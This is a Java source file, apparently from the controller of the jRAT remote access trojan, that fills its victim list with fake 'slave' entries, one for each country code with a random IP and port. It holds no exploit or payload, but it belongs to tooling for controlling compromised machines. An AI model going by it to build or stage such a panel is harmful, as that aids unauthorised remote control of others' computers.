package pro.jrat.client;

import java.util.Random;

import pro.jrat.client.settings.Statistics;
import pro.jrat.client.ui.frames.Frame;
import pro.jrat.client.utils.NetUtils;

public class SampleMode {

	private static boolean sampleMode = false;

	public static boolean isInSampleMode() {
		return sampleMode;
	}

	public static void start(boolean stats) {
		sampleMode = true;
		make("AD", stats);
		make("AE", stats);
		make("AF", stats);
		make("AG", stats);
		make("AI", stats);
		make("AL", stats);
		make("AM", stats);
		make("AN", stats);
		make("AO", stats);
		make("AR", stats);
		make("AS", stats);
		make("AT", stats);
		make("AU", stats);
		make("AW", stats);
		make("AX", stats);
		make("AZ", stats);
		make("BA", stats);
		make("BB", stats);
		make("BD", stats);
		make("BE", stats);
		make("BF", stats);
		make("BG", stats);
		make("BH", stats);
		make("BI", stats);
		make("BJ", stats);
		make("BM", stats);
		make("BN", stats);
		make("BO", stats);
		make("BR", stats);
		make("BS", stats);
		make("BT", stats);
		make("BV", stats);
		make("BW", stats);
		make("BY", stats);
		make("BZ", stats);
		make("CA", stats);
		make("CC", stats);
		make("CD", stats);
		make("CF", stats);
		make("CG", stats);
		make("CH", stats);
		make("CI", stats);
		make("CK", stats);
		make("CL", stats);
		make("CM", stats);
		make("CN", stats);
		make("CO", stats);
		make("CR", stats);
		make("CS", stats);
		make("CU", stats);
		make("CV", stats);
		make("CX", stats);
		make("CY", stats);
		make("CZ", stats);
		make("DE", stats);
		make("DJ", stats);
		make("DK", stats);
		make("DM", stats);
		make("DO", stats);
		make("DZ", stats);
		make("EC", stats);
		make("EE", stats);
		make("EG", stats);
		make("EH", stats);
		make("ENGLAND", stats);
		make("ER", stats);
		make("unknown", stats);
		make("ES", stats);
		make("ET", stats);
		make("FAM", stats);
		make("FI", stats);
		make("FJ", stats);
		make("FK", stats);
		make("FM", stats);
		make("FO", stats);
		make("FR", stats);
		make("GA", stats);
		make("GB", stats);
		make("GD", stats);
		make("GE", stats);
		make("GH", stats);
		make("GI", stats);
		make("GL", stats);
		make("GM", stats);
		make("GN", stats);
		make("GP", stats);
		make("GQ", stats);
		make("GR", stats);
		make("GS", stats);
		make("GT", stats);
		make("GU", stats);
		make("GW", stats);
		make("GY", stats);
		make("HK", stats);
		make("HN", stats);
		make("HR", stats);
		make("HT", stats);
		make("HU", stats);
		make("ICON", stats);
		make("ID", stats);
		make("IE", stats);
		make("IL", stats);
		make("IN", stats);
		make("IO", stats);
		make("IQ", stats);
		make("IR", stats);
		make("IS", stats);
		make("IT", stats);
		make("JM", stats);
		make("JO", stats);
		make("JP", stats);
		make("KE", stats);
		make("KG", stats);
		make("KH", stats);
		make("KI", stats);
		make("KM", stats);
		make("KN", stats);
		make("KP", stats);
		make("KR", stats);
		make("KW", stats);
		make("KY", stats);
		make("KZ", stats);
		make("LA", stats);
		make("LB", stats);
		make("LC", stats);
		make("LI", stats);
		make("LK", stats);
		make("LR", stats);
		make("LS", stats);
		make("LT", stats);
		make("LU", stats);
		make("LV", stats);
		make("LY", stats);
		make("MA", stats);
		make("MC", stats);
		make("MD", stats);
		make("MG", stats);
		make("MH", stats);
		make("MK", stats);
		make("ML", stats);
		make("MM", stats);
		make("MN", stats);
		make("MO", stats);
		make("MP", stats);
		make("MQ", stats);
		make("MR", stats);
		make("MS", stats);
		make("MT", stats);
		make("MU", stats);
		make("MV", stats);
		make("MW", stats);
		make("MX", stats);
		make("MY", stats);
		make("MZ", stats);
		make("NA", stats);
		make("NC", stats);
		make("NE", stats);
		make("NF", stats);
		make("NG", stats);
		make("NI", stats);
		make("NL", stats);
		make("NO", stats);
		make("NP", stats);
		make("NR", stats);
		make("NU", stats);
		make("NZ", stats);
		make("OM", stats);
		make("PA", stats);
		make("PE", stats);
		make("PF", stats);
		make("PG", stats);
		make("PH", stats);
		make("PK", stats);
		make("PL", stats);
		make("PM", stats);
		make("PN", stats);
		make("PR", stats);
		make("PS", stats);
		make("PT", stats);
		make("PW", stats);
		make("PY", stats);
		make("QA", stats);
		make("RO", stats);
		make("RU", stats);
		make("RW", stats);
		make("SA", stats);
		make("SB", stats);
		make("SC", stats);
		make("SCOTLAND", stats);
		make("SD", stats);
		make("SE", stats);
		make("SG", stats);
		make("SH", stats);
		make("SI", stats);
		make("SK", stats);
		make("SL", stats);
		make("SM", stats);
		make("SN", stats);
		make("SO", stats);
		make("SR", stats);
		make("ST", stats);
		make("SV", stats);
		make("SY", stats);
		make("SZ", stats);
		make("TC", stats);
		make("TD", stats);
		make("TF", stats);
		make("TG", stats);
		make("TH", stats);
		make("TJ", stats);
		make("TK", stats);
		make("TL", stats);
		make("TM", stats);
		make("TN", stats);
		make("TO", stats);
		make("TR", stats);
		make("TT", stats);
		make("TV", stats);
		make("TW", stats);
		make("TZ", stats);
		make("UA", stats);
		make("UG", stats);
		make("UK", stats);
		make("UM", stats);
		make("US", stats);
		make("UY", stats);
		make("UZ", stats);
		make("VA", stats);
		make("VC", stats);
		make("VE", stats);
		make("VG", stats);
		make("VI", stats);
		make("VN", stats);
		make("VU", stats);
		make("WALES", stats);
		make("WF", stats);
		make("WS", stats);
		make("YE", stats);
		make("YT", stats);
		make("ZA", stats);
		make("ZM", stats);
		make("ZW", stats);
	}

	public static void make(String country, boolean stats) {
		int i = (new Random()).nextInt(65535);

		String ip = NetUtils.randomizeIP() + " / " + i;

		Slave slave = generate(country, ip);

		if (stats) {
			int howMany = new Random().nextInt(100);
			for (int s = 0; s < howMany; s++) {
				Statistics.getGlobal().add(slave);
			}
		} else {
			Frame.mainModel.addRow(new Object[] { country, "Example", "Example", ip, "0", "Example", "Example", "Example" });
		}
	}

	public static Slave generate(final String country, String ip) {
		Slave slave = new Slave(ip) {
			@Override
			public String getCountry() {
				return country;
			}
		};

		return slave;
	}

}
